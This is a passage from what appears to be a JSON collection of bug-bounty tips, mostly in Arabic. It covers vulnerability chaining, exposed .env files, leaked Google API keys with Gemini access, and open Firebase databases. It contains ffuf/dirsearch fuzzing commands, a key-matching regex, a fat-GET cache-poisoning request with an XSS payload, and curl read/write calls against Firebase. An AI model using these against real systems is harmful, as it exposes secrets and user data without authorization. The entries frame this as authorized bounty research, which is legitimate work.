+    "How It Works": "البلاغ بـP3 ضعيف غالبًا لأن السلسلة توقفت مبكرًا. فكّر في التصعيد داخل النطاق فقط: SSRF قد يصل لـmetadata/internal admin؛ Self-XSS قد يصبح قابل للاستغلال عبر clickjacking أو CSRF إذا وُجدت نقطة إقناع الضحية؛ Directory listing → configs → internal hosts → SSRF → path traversal → admin API → secrets. وثّق كل حلقة بدليل منفصل ووقف عند الحد المصرّح.",
+    "Payload / Code": "Chain checklist (authorized scope only):\nDirectory Listing → Exposed Configs → Internal Host Discovery → SSRF → Path Traversal → Internal Admin API → Secrets\nDon't report SSRF alone if internal RCE/metadata is reachable\nDon't report Self-XSS alone if clickjacking/CSRF can deliver it\nDon't report Self-Stored XSS alone if CSRF can trigger it",
+    "Source": "Abhishek + Youssef Mohamed tips (X)"
+  },
+  {
+    "Title": "Excessive API fields + GDPR/CCPA framing لرفع الـ Severity",
+    "Category": "[\"API Hacking\",\"General\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "لما الـ API بيرجع fields زيادة (address, phone, SSN last4, internal notes)، اكتب التقرير مع ذكر GDPR/CCPA risk و business impact (identity theft, regulatory fines). ده بيرفع الـ severity من Low/Medium لـ High في كتير من البرامج.",
+    "Payload / Code": "قارن الـ UI fields مع الـ raw JSON response",
+    "Source": "ToxSec Medium + Intigriti privacy guidance"
+  },
+  {
+    "Title": "Exposed .env على subdomain = $250–$10k+ (Easy $250 case + higher)",
+    "Category": "[\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعد subfinder + httpx، شغّل ffuf/dirsearch على .env و .env.backup و .env.local. في حالة exam proctoring موقع طلع .env وخد $250. في fintech طلع Stripe + AWS = آلاف.",
+    "Payload / Code": "ffuf -u https://FUZZ.target.com/.env -w subs.txt -mc 200\ndirsearch -u https://sub.target.com -e env,bak,sql -t 30",
+    "Source": "Abhijeet Kumawat writeup ($250) + multiple fintech cases $500–$10k+"
+  },
+  {
+    "Title": "Exposed Google Maps API keys may unlock Gemini — validate model access not just Maps",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعض مفاتيح Google Maps (AIza…) المنشورة في JS قد تكون مربوطة بمشروع Cloud فيه Gemini/Generative Language مفعّل بدون قيود كافية. وجود المفتاح وحده ليس ثغرة؛ الأثر يبدأ عندما يثبت أن نفس المفتاح يستدعي models أو يتجاوز referrer/API restrictions. ابحث في: JS/source maps، Wayback، Android APKs، web assets. بعد الاستخراج اختبر فقط على نطاق مصرّح ووثّق الـAPI المفعّلة والقيود (HTTP referrer، IP، API restrictions) قبل أي بلاغ.",
+    "Payload / Code": "Hunt sources: JS bundles, .js.map, waybackurls, APK strings.\nPattern: AIza[0-9A-Za-z_-]{35}\nValidate impact (authorized only): try Generative Language / Gemini endpoints if program allows; check Maps quotas vs other Google APIs; document restriction bypass evidence.\nTool mention: geminiHunter (community) for multi-source discovery — treat output as LEAD until impact proven.",
+    "Source": "Zeroday Lab / geminiHunter tip (X, Nov 2026)"
+  },
+  {
+    "Title": "Fat GET Requests — تمرير Params في الـ Body لتجاوز Cache Key",
+    "Category": "[\"WAF Bypass\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "بعض السيرفرات (خصوصًا Ruby/PHP/بعض الـ frameworks) بتقرا الباراميترات من body بتاع ريكوست GET كمان. الكاش بيعمل الـ cache key على الـ URL/query فقط ومبيشوفش الـ body، فالقيمة اللي في الـ body تعتبر unkeyed input. ده بيديك مدخل مخفي تسمّم بيه الكاش أو تتجاوز فلاتر الـ WAF اللي بتفحص الـ query string بس.",
+    "Payload / Code": "GET /search?q=test HTTP/1.1\nHost: target.com\nContent-Length: 24\n\nq=<script>alert(1)</script>\n// بعض الـ frameworks بتقرا الـ params من body الـ GET، بينما الكاش بيعمل key على query string بس",
+    "Source": "SecurityCipher — Web Cache Poisoning Playbook 2026"
+  },
+  {
+    "Title": "FindSomething browser extension for credential-shaped strings during recon",
+    "Category": "[\"Recon\",\"General\"]",
+    "Rating": "⭐ جيدة",
+    "Status": "Not started",
+    "How It Works": "While browsing the target, FindSomething highlights potential secrets and interesting strings in page source and loaded assets. Useful as a passive assist next to JS Miner / manual review; always validate false positives.",
+    "Payload / Code": "Install FindSomething (browser extension)\nBrowse in-scope app pages and JS-heavy flows\nReview highlighted candidates → classify public vs sensitive\nDo not auto-report client-side publishable keys without impact",
+    "Source": "Mohamed Ahmed — FindSomething tip"
+  },
+  {
+    "Title": "Firebase Realtime DB / Firestore open rules → full read/write (classic high impact)",
+    "Category": "[\"API Hacking\",\"Recon\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "من الـ JS أو APK (apktool + grep firebaseio) خد الـ project URL. جرب /.json. لو data رجعت = public read. جرب POST/PUT عشان write. حتى لو Permission denied، جرب self-register + auth != null rules.",
+    "Payload / Code": "curl https://PROJECT.firebaseio.com/.json\ncurl -X PUT -d '{\"test\":\"bounty\"}' https://PROJECT.firebaseio.com/test.json",
+    "Source": "Multiple writeups + Intigriti Firebase guide + mobile APK decompile tips"
+  },
+  {
+    "Title": "Firebase Realtime DB open rules (read/write without auth)",
+    "Category": "[\"Recon\",\"API Hacking\"]",
+    "Rating": "🔥 قوية",
+    "Status": "Not started",
+    "How It Works": "دور على PROJECT.firebaseio.com أو من الـ JS. جرب /.json بدون auth. لو رجع data أو قبل write → High.",
+    "Payload / Code": "curl https://PROJECT-default-rtdb.firebaseio.com/.json\ncurl -X PUT -d '{\"test\":1}' https://PROJECT-default-rtdb.firebaseio.com/test.json",
+    "Source": "Multiple 2025-2026 writeups + GCP playbook"
+  }
+]
